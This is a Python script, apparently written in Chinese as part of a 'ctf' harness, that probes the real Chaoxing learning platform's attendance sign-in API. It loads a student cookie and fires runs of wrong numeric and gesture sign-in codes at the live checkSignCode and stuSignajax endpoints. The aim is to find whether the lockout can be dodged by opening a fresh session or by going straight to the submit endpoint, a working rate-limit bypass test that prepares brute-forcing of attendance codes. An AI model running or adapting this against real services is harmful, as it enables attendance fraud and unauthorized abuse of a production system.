# -*- coding: utf-8 -*-
"""签到码/手势的锁：6 次错就锁 1 小时？锁在哪个端点、能不能换 session 绕过、直接提交端点是否也锁。"""
import json, os, re, sys, time
import requests
os.chdir("/Users/xi/Documents/deepseek-harness/ctf/chaoxing")
UA_APP = ('Mozilla/5.0 (Linux; Android 13; SM-G975F Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) '
          'Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 (schild:26f6a66da55ad239903fba6f674e8c66) (device:SM-G975F) '
          'Language/zh_CN com.ssreader.ChaoXingStudy/ChaoXingStudy_3_6_2_android_phone_20230101')
MOBILE = "https://mobilelearn.chaoxing.com"
COURSE, CLAZZ, SUID = "269282723", "159926750", "[学生PUID]"
CODE_AID, TRUE_CODE = "4000182047286", "246810"
GEST_AID, TRUE_GEST = "4000182047307", "147258"
sck = open("ck.txt", encoding="utf-8").read().strip()
out = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "code": [], "gest": [], "session_swap": []}

def S():
    s = requests.Session(); s.headers.update({"Cookie": sck, "User-Agent": UA_APP}); return s

def check(sess, aid, code):
    r = sess.get(MOBILE + "/widget/sign/pcStuSignController/checkSignCode",
                 params={"activeId": aid, "signCode": code}, timeout=20)
    return r.status_code, r.text.strip()[:100]

def submit(sess, aid, code):
    p = {"activeId": aid, "courseId": COURSE, "uid": SUID, "clientip": "", "useragent": "",
         "latitude": "-1", "longitude": "-1", "appType": "0", "fid": "0", "name": "", "signCode": code}
    r = sess.get(MOBILE + "/pptSign/stuSignajax", params=p, timeout=25)
    return r.status_code, r.text.strip()[:100]

print("===== A) checkSignCode 连续错码（学生 cookie，同一 session）=====")
s1 = S()
for i in range(1, 8):
    code = "{:06d}".format(900000 + i)
    st, b = check(s1, CODE_AID, code)
    out["code"].append({"try": i, "code": code, "http": st, "body": b})
    print("  第%d次错码 %s -> HTTP %s : %s" % (i, code, st, b))
    if "锁定" in b or "过多" in b:
        break
    time.sleep(0.3)

print()
print("===== B) 锁后换全新 session（同 cookie）还能不能试 =====")
s2 = S()
st, b = check(s2, CODE_AID, "900009")
out["session_swap"].append({"endpoint": "checkSignCode_new_session", "http": st, "body": b})
print("  新 session 错码 -> HTTP %s : %s" % (st, b))

print()
print("===== C) 直接提交端点（stuSignajax）错码：也锁吗？锁后对不对？=====")
seq = []
for i, code in enumerate(["900011", "900012", "900013", "900014", "900015", "900016", TRUE_CODE], 1):
    st, b = submit(s1, CODE_AID, code)
    seq.append({"try": i, "code": code, "http": st, "body": b})
    tag = "★真码" if code == TRUE_CODE else "错码"
    print("  %s %s -> HTTP %s : %s" % (tag, code, st, b))
    time.sleep(0.3)
out["code_submit"] = seq

print()
print("===== D) 手势类同测 =====")
s3 = S()
g = []
for i, code in enumerate(["111111", "222222", "333333", "444444", "555555", "666666", TRUE_GEST], 1):
    st, b = submit(s3, GEST_AID, code)
    g.append({"try": i, "code": code, "http": st, "body": b})
    tag = "★真手势" if code == TRUE_GEST else "错手势"
    print("  %s %s -> HTTP %s : %s" % (tag, code, st, b))
    time.sleep(0.3)
out["gest"] = g

json.dump(out, open("out/stu_lock_test.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
print()
print("[saved] out/stu_lock_test.json")
